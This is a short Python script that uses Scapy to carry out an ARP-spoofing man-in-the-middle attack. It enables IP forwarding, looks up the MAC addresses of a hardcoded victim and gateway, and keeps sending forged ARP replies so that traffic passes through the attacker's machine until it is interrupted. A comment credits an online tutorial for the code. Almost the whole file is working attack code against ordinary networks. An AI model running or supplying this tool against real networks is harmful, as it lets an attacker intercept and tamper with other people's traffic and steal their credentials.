from scapy.all import *
import sys
import os
import time

# code for mitm attack found here: https://null-byte.wonderhowto.com/how-to/build-man-middle-tool-with-scapy-and-python-0163525/

# print("Enter victim's IP address: ")
# victimIP = input()
# print("Enter gateway IP address: ")
# gatewayIP = input()
# victimIP = '10.0.2.10'
# gatewayIP = '10.0.0.1'


def enable_ip_forwarding():
    print ("\n[*] Enabling IP Forwarding...\n")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    print ("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2,  inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def reARP():

    print ("\n[*] Restoring Targets...")
    victimMAC = get_mac(victimIP)
    gatewayMAC = get_mac(gatewayIP)
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatewayMAC), count = 7)
    disable_ip_forwarding()
    print ("[*] Shutting Down...")
    sys.exit(1)

def trick(gm, vm):
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))

def mitm():
    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        disable_ip_forwarding()
        print ("[!] Couldn't Find Victim MAC Address")
        print ("[!] Exiting...")
        sys.exit(1)
    try:
        gatewayMAC = get_mac(gatewayIP)
    except Exception:
        disable_ip_forwarding()
        print ("[!] Couldn't Find Gateway MAC Address")
        print ("[!] Exiting...")
        sys.exit(1)
    print ("[*] Poisoning Targets...")  
    while 1:
        try:
            trick(gatewayMAC, victimMAC)
            time.sleep(2)
        except KeyboardInterrupt:
            reARP()
            break

interface = 'wlan0'
# victimIP = sys.argv[2]
victimIP = '10.0.2.10'
# gatewayIP = sys.argv[3] 
gatewayIP = '10.0.0.1'

enable_ip_forwarding()
mitm()